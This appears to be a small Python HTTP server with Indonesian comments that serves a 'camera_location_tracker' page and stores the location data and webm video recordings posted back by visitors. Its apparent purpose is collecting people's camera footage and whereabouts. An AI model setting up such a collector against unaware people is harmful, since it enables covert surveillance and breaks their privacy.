import http.server
import socketserver
import json
from urllib.parse import parse_qs

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        if self.path == '/location':
            try:
                data = json.loads(post_data.decode('utf-8'))
                print("Lokasi diterima:", data)
            except Exception as e:
                print("Error parsing lokasi:", e)

        elif self.path == '/upload':
            # Simpan video ke file
            filename = 'uploads/rekaman.webm'
            with open(filename, 'wb') as f:
                f.write(post_data)
            print(f"Video disimpan sebagai: {filename}")

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status": "berhasil"}')

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('camera_location_tracker.html', 'rb') as f:
                self.wfile.write(f.read())

if __name__ == "__main__":
    import os
    if not os.path.exists('uploads'):
        os.makedirs('uploads')

    PORT = 5000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Server berjalan di http://localhost:{PORT}")
        httpd.serve_forever()
